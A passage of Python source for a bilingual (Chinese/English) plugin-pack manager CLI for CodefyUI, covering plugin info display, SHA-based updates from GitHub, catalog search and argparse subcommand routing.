        manifest = tomllib.loads(_gh_get(raw).decode("utf-8"))
    except (HTTPError, URLError, tomllib.TOMLDecodeError, UnicodeDecodeError) as e:
        err(f"無法取得 manifest：{e}", f"Could not fetch manifest from {raw}: {e}")
        return 1
    synthetic_entry = {
        "source_kind": "github_url",
        "source": f"{owner}/{repo}" + (f"@{ref}" if ref else ""),
        "url": f"https://github.com/{owner}/{repo}",
        "ref": ref,
        "sha": sha,
        "manifest": manifest.get("plugin", {}),
    }
    _print_info(manifest.get("plugin", {}).get("id", "(unnamed)"), manifest, synthetic_entry, None, installed=False)
    return 0


def _print_info(
    plugin_id: str,
    manifest: dict[str, Any],
    entry: dict[str, Any],
    plugin_dir: Path | None,
    *,
    installed: bool,
) -> None:
    plugin_meta = manifest.get("plugin", {}) or {}
    lessons_meta = manifest.get("lessons", {}) or {}
    deps = manifest.get("python_deps", {}) or {}
    status_zh = "已安裝" if installed else "未安裝"
    status_en = "INSTALLED" if installed else "AVAILABLE"
    print(f"\n{BOLD}{plugin_id}{RESET}  {DIM}[{t(status_zh, status_en)}]{RESET}")

    fields: list[tuple[str, str]] = []
    if plugin_meta.get("name"):
        fields.append(("name", plugin_meta["name"]))
    if plugin_meta.get("version"):
        fields.append(("version", plugin_meta["version"]))
    if plugin_meta.get("description"):
        fields.append(("description", plugin_meta["description"]))
    if entry.get("source_kind"):
        fields.append(("source", f"{entry['source_kind']}:{entry.get('source', '')}"))
    if entry.get("sha"):
        fields.append(("sha", entry["sha"][:12]))
    if entry.get("url"):
        fields.append(("url", entry["url"]))
    if lessons_meta.get("chapters"):
        fields.append(("chapters", ", ".join(lessons_meta["chapters"])))
    if lessons_meta.get("lessons"):
        fields.append(("lessons", ", ".join(lessons_meta["lessons"])))
    if deps:
        fields.append(("deps", ", ".join(f"{k}{v}" for k, v in deps.items())))

    width = max(len(k) for k, _ in fields) + 2 if fields else 0
    for k, v in fields:
        print(f"  {DIM}{(k + ':').ljust(width)}{RESET} {v}")

    if installed and plugin_dir is not None and (plugin_dir / "nodes").exists():
        nodes = sorted(
            f.stem for f in (plugin_dir / "nodes").glob("*.py")
            if not f.name.startswith("_") and f.name != "__init__.py"
        )
        print(f"  {DIM}{'nodes:'.ljust(width)}{RESET} {', '.join(nodes) if nodes else '(none)'}")

    if installed and plugin_dir is not None:
        readme = plugin_dir / "README.md"
        if readme.exists():
            try:
                preview = "\n".join(readme.read_text(encoding="utf-8").splitlines()[:8])
            except OSError:
                preview = ""
            if preview:
                print(f"\n  {DIM}README.md preview:{RESET}")
                for line in preview.splitlines():
                    print(f"    {line}")


def cmd_update(args: argparse.Namespace) -> int:
    lockfile = load_lockfile()
    if args.plugin_id:
        ids = [args.plugin_id.lower()]
    else:
        ids = sorted(lockfile.get("plugins", {}).keys())

    if not ids:
        info("沒有可更新的外掛", "No plugins to update")
        return 0

    updated = 0
    skipped = 0
    for plugin_id in ids:
        entry = lockfile.get("plugins", {}).get(plugin_id)
        if not entry:
            err(f"找不到外掛 {plugin_id}", f"Plugin '{plugin_id}' is not installed")
            return 1

        kind = entry.get("source_kind")
        if kind == "builtin":
            info(
                f"{plugin_id}: 內建包，請以 cdui update 更新",
                f"{plugin_id}: built-in pack — update with `cdui update`",
            )
            skipped += 1
            continue

        if kind != "github_url":
            warn(f"{plugin_id}: 未知的 source_kind {kind!r}", f"{plugin_id}: unknown source_kind {kind!r}")
            skipped += 1
            continue

        url = entry.get("url", "")
        m = _GITHUB_URL.match(url) or _GITHUB_SHORT.match(entry.get("source", ""))
        if not m:
            err(f"{plugin_id}: 無法解析來源 {url or entry.get('source')}",
                f"{plugin_id}: could not parse source")
            return 1
        owner, repo = m.group(1), m.group(2)
        ref = entry.get("ref", "") or ""

        try:
            new_sha = resolve_sha(owner, repo, ref or "HEAD")
        except RuntimeError as e:
            err(f"{plugin_id}: {e}", f"{plugin_id}: {e}")
            return 1

        if new_sha == entry.get("sha"):
            info(
                f"{plugin_id}: 已是最新版 ({new_sha[:7]})",
                f"{plugin_id}: already up to date ({new_sha[:7]})",
            )
            skipped += 1
            continue

        section(
            f"更新 {plugin_id}: {entry.get('sha', '')[:7]} → {new_sha[:7]}",
            f"Updating {plugin_id}: {entry.get('sha', '')[:7]} → {new_sha[:7]}",
        )
        synthetic_args = argparse.Namespace(
            force=True,
            no_confirm=True,
            trust_author=bool(entry.get("trusted_modules")),
        )
        rc = _install_github(owner, repo, ref, synthetic_args, lockfile)
        if rc != 0:
            return rc
        updated += 1
        # Reload lockfile so subsequent iterations see the new install state.
        lockfile = load_lockfile()

    ok(
        f"完成：更新 {updated} 個，略過 {skipped} 個",
        f"Done: updated {updated}, skipped {skipped}",
    )
    return 0


def cmd_search(args: argparse.Namespace) -> int:
    catalog = load_catalog()
    plugins = catalog.get("plugins", {})
    if not plugins:
        info("目錄為空", "Catalog is empty")
        return 0

    query = (args.query or "").lower().strip()
    lockfile_ids = set(load_lockfile().get("plugins", {}).keys())

    matches: list[tuple[str, dict[str, Any]]] = []
    for plugin_id, entry in plugins.items():
        haystack = " ".join([
            plugin_id,
            entry.get("name", ""),
            entry.get("description", ""),
            " ".join(entry.get("chapters", []) or []),
            " ".join(entry.get("tags", []) or []),
        ]).lower()
        if not query or query in haystack:
            matches.append((plugin_id, entry))

    if not matches:
        info(
            f"找不到符合 '{args.query}' 的項目",
            f"No catalog entries match '{args.query}'",
        )
        return 0

    section(f"目錄 ({len(matches)})", f"Catalog ({len(matches)} entries)")
    width = max(len(pid) for pid, _ in matches) + 2
    for plugin_id, entry in sorted(matches):
        marker = f"{GREEN}●{RESET}" if plugin_id in lockfile_ids else " "
        print(
            f"  {marker} {BOLD}{plugin_id.ljust(width)}{RESET}"
            f"{entry.get('name', plugin_id)}"
        )
        desc = entry.get("description", "")
        if desc:
            print(f"    {' ' * width}{DIM}{desc}{RESET}")
    print(f"\n  {DIM}{t('● = 已安裝', '● = installed')}{RESET}")
    return 0


# ── argparse routing ───────────────────────────────────────────────────────

def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(prog="cdui plugin", description="Manage CodefyUI plugin packs")
    sub = p.add_subparsers(dest="plugin_cmd", required=True)

    p_inst = sub.add_parser("install", help="Install one or more plugin packs")
    p_inst.add_argument("source", nargs="+",
                        help="catalog name(s), owner/repo[@ref], or GitHub URL — one or more")
    p_inst.add_argument("--force", action="store_true",
                        help="reinstall over an existing version")
    p_inst.add_argument("--no-confirm", "-y", action="store_true",
                        help="skip the URL-install confirmation prompt")
    p_inst.add_argument(
        "--trust-author",
        action="store_true",
        help="accept a third-party plugin's declared [security].allowed_modules",
    )
    p_inst.set_defaults(_func=cmd_install)

    p_list = sub.add_parser("list", help="List installed plugins")
    p_list.set_defaults(_func=cmd_list)

    p_un = sub.add_parser("uninstall", help="Remove an installed plugin")
    p_un.add_argument("plugin_id")
    p_un.set_defaults(_func=cmd_uninstall)

    p_link = sub.add_parser(
        "link",
        help="Link a local plugin directory for development (loaded in place, no copy)",
    )
    p_link.add_argument("path", help="path to the local plugin dir (contains cdui.plugin.toml)")
    p_link.add_argument("--force", action="store_true",
                        help="overwrite an existing entry with the same id")
    p_link.set_defaults(_func=cmd_link)

    p_unlink = sub.add_parser(
        "unlink",
        help="Remove a linked local plugin (lockfile entry only; your files are untouched)",
    )
    p_unlink.add_argument("plugin_id")
    p_unlink.set_defaults(_func=cmd_unlink)

    p_reload = sub.add_parser(
        "reload",
        help="Hot-reload the running server's plugins/nodes (pick up edits to a linked plugin)",
    )
    p_reload.set_defaults(_func=cmd_reload)

    p_dev = sub.add_parser(
        "dev",
        help="Link a local plugin and watch it — hot-reload on every change",
    )
    p_dev.add_argument("path", help="path to the local plugin dir (contains cdui.plugin.toml)")
    p_dev.add_argument("--interval", type=float, default=1.0,
                       help="seconds between change checks (default 1.0)")
    p_dev.add_argument("--once", action="store_true",
                       help="link + reload once and exit (no watch)")
    p_dev.set_defaults(_func=cmd_dev)

    p_en = sub.add_parser(
        "enable",
        help="Activate an installed plugin (write enabled=true to lockfile)",
    )
    p_en.add_argument("plugin_id")
    p_en.set_defaults(_func=cmd_enable)

    p_dis = sub.add_parser(
        "disable",
        help="Deactivate an installed plugin without uninstalling — files stay on disk",
    )
    p_dis.add_argument("plugin_id")
    p_dis.set_defaults(_func=cmd_disable)

    p_info = sub.add_parser("info", help="Show manifest + lockfile details for a plugin")
    p_info.add_argument("source_or_id",
                        help="installed plugin id, catalog name, or remote source")
    p_info.set_defaults(_func=cmd_info)

    p_up = sub.add_parser("update", help="Re-resolve SHA from the recorded ref and reinstall if changed")
    p_up.add_argument("plugin_id", nargs="?", default=None,
                      help="plugin id to update (omit for all installed third-party packs)")
    p_up.set_defaults(_func=cmd_update)

    p_search = sub.add_parser("search", help="Search the first-party catalog")
    p_search.add_argument("query", nargs="?", default="",
                          help="substring against id / name / description / chapters / tags")
    p_search.set_defaults(_func=cmd_search)

    return p


def main(argv: list[str] | None = None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)
    return args._func(args)


if __name__ == "__main__":
    sys.exit(main())
